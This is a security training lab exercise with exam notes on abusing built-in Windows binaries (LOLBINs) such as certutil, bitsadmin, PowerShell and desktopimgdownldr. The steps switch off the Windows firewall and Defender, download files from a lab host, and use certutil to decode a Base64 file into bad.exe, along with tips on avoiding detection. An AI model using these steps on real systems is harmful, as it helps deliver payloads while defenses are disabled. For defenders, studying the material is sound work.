# Exercise 4 – Leveraging Legitimate Binaries and Scripts (LOLBINS & LOLBAS)

## Objective
Learn how attackers abuse legitimate Windows binaries (LOLBINS/LOLBAS) to perform actions such as downloading files and decoding Base64 content using trusted Windows tools.

> **Note:** This knowledge is for understanding attacker techniques and improving detection in authorized lab environments.

---

# What is LOLBIN / LOLBAS?

### LOLBIN
**Living Off the Land Binary**

Legitimate Windows executable that can be misused.

Examples:
- CertUtil
- BITSAdmin
- PowerShell
- desktopimgdownldr.exe
- Excel

### LOLBAS
**Living Off the Land Binaries And Scripts**

A project that documents Windows binaries, scripts, and libraries that attackers may abuse.

---

# Lab Steps

## Step 1 – Disable Windows Defender Firewall

Go to:

```
Control Panel
→ System and Security
→ Windows Defender Firewall
→ Turn Windows Defender Firewall on or off
```

Turn Firewall **OFF**.

---

## Step 2 – Disable Real-time Protection

Search:

```
Virus & Threat Protection
```

Go to

```
Manage Settings
```

Turn

```
Real-time Protection → OFF
```

If UAC appears:

```
Click Yes
```

---

# Step 3 – Download using CertUtil

Command:

```cmd
certutil -urlcache -split -f "http://pentestinglabs.com/FS.zip"
```

### Purpose

Downloads a file using the built-in Windows **CertUtil** tool.

### Important Options

| Option | Meaning |
|---------|----------|
| -urlcache | Download file |
| -split | Split/process downloaded content |
| -f | Force overwrite |

Result:

```
FS.zip downloaded
```

---

# Step 4 – Enable Defender Again

Turn

```
Real-time Protection → ON
```

---

# Step 5 – Defender Detection

Command:

```cmd
certutil -urlcache -split -f "http://pentestinglabs.com/repo.txt"
```

Result:

```
Blocked / Denied
```

### Important Observation

Even though

```
repo.txt
```

is only a text file,

Windows Defender blocks it because

```
certutil.exe
```

is a commonly abused LOLBIN.

---

# Step 6 – Download Encoded File

Command:

```cmd
certutil -urlcache -split -f "http://pentestinglabs.com/malice.txt" malice.txt
```

Result:

```
malice.txt
```

Downloaded.

This file is Base64 encoded.

---

# Step 7 – Decode Base64 File

Command:

```cmd
certutil -decode malice.txt bad.exe
```

### Purpose

Decodes a Base64 encoded file.

### Options

| Part | Meaning |
|------|---------|
| -decode | Decode Base64 |
| malice.txt | Input file |
| bad.exe | Output file |

---

# Question 8.4.1

### Which option decodes a Base64 encoded file?

**Answer**

```
-decode
```

---

# Step 8 – Download using BITSAdmin

Command:

```cmd
bitsadmin /transfer myJob /download /priority normal https://pentestinglabs.com/malice.txt C:\Windows\Temp\malice.txt
```

### Purpose

Downloads a file using the Windows Background Intelligent Transfer Service (BITS).

### Important Options

| Option | Meaning |
|---------|----------|
| /transfer | Create transfer job |
| myJob | Job name |
| /download | Download mode |
| /priority normal | Normal priority |

Result:

```
malice.txt
```

saved in

```
C:\Windows\Temp
```

---

# Step 9 – Verify Download

Commands:

```cmd
cd C:\Windows\Temp
```

```cmd
dir
```

Verify

```
malice.txt
```

exists.

---

# Step 10 – Download using PowerShell

Command:

```powershell
Invoke-WebRequest -Uri "https://pentestinglabs.com/malice.txt" -OutFile "C:\Users\Admin\malice.txt"
```

### Purpose

Downloads a file from a URL.

### Important Parameters

| Parameter | Meaning |
|-----------|----------|
| -Uri | Source URL |
| -OutFile | Save destination |

---

# Step 11 – desktopimgdownldr.exe

Command:

```cmd
desktopimgdownldr /lockscreenurl:https://domain.com:8080/file.ext /eventName:randomname
```

Purpose:

Downloads a file using the Windows lock screen image downloader.

### Interesting Fact

Actual download is performed by

```
svchost.exe (BITS service)
```

instead of

```
desktopimgdownldr.exe
```

making detection more difficult.

---

# Step 12 – One-liner Example

Lab demonstrates another command using

```
mklink
```

and

```
desktopimgdownldr.exe
```

to download a file while cleaning artifacts afterward.

Purpose:

Shows another LOLBIN technique.

---

# Step 13 – Verify File

Location:

```
C:\Users\Admin\AppData\Local\Temp\Personalization\LockScreenImage
```

Open the downloaded file.

---

# Step 14 – Excel LOLBIN

Microsoft Excel can also open/download remote files in certain situations.

Another example of a legitimate application that attackers may abuse.

---

# Common LOLBINS

| Tool | Purpose |
|------|----------|
| CertUtil | Download files & decode Base64 |
| BITSAdmin | Download files |
| PowerShell | Download files |
| desktopimgdownldr.exe | Download through lock screen |
| Excel | Open/download remote files |

---

# Key Points for Exam

- LOLBIN = Legitimate Windows executable abused by attackers.
- LOLBAS = Collection of binaries, scripts, and libraries that can be abused.
- CertUtil can download files using **-urlcache**.
- CertUtil can decode Base64 using **-decode**.
- BITSAdmin downloads files through the Windows BITS service.
- PowerShell uses **Invoke-WebRequest** to download files.
- Defender may block CertUtil because it is frequently abused, regardless of the file type.

---

# Quick Revision

## CertUtil Download

```cmd
certutil -urlcache -split -f "<URL>"
```

---

## CertUtil Decode

```cmd
certutil -decode input.txt output.exe
```

---

## BITSAdmin Download

```cmd
bitsadmin /transfer myJob /download /priority normal <URL> <Destination>
```

---

## PowerShell Download

```powershell
Invoke-WebRequest -Uri "<URL>" -OutFile "<Destination>"
```

---

# Final Answer

### Question 8.4.1

**Option used to decode a Base64 encoded file**

```
-decode
```

**Answer:** ✅ `-decode`
````
